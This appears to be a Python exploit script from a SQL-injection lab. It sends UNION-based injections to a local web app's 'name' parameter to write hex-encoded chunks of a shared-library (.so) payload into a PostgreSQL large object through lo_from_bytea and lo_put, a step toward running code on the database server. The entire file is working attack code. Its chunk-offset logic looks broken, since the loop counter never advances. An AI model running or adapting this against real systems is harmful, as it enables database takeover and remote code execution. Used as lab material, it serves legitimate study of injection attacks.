import requests
import sys,os
  
URL = "http://localhost:5000/user" # URL of the vulnerable application
DIR = "E:/Filelocation/Information-Security/Lab/SQLi/Postgre-SQL/Postgre_SQL/payload_chunks" # Directory containing the files to file .so decode hex
OID = 8382 # OID of the large object in PostgreSQL
CHUNK_SIZE = 2048  # Size of each chunk in bytes
LOOP = 1 # Number of chunks 
for filename in os.listdir(DIR):
    file_path = os.path.join(DIR, filename)
    with open(file_path, 'r') as file:
        if file.name.endswith("_0"): # Intial, we need to create the large object in PostgreSQL
            with open(file_path, 'r') as file:
                data = file.read()
            payload = {"name": f"a' union select 1333,CAST((select lo_from_bytea({OID},decode('{data}','hex'))) as text),1-- -"}
            res = requests.get(URL, params=payload)
            print(payload)
            print("\n")
        else:
            with open(file_path, 'r') as file: # Continue to write the large object in PostgreSQL
                data = file.read()
            payload = {"name": f"a' union select 1333,CAST((select lo_put({OID},{CHUNK_SIZE*LOOP},decode('{data}','hex'))) as text),1-- -"}
            res = requests.get(URL, params=payload)
            print(payload)
            print("\n")
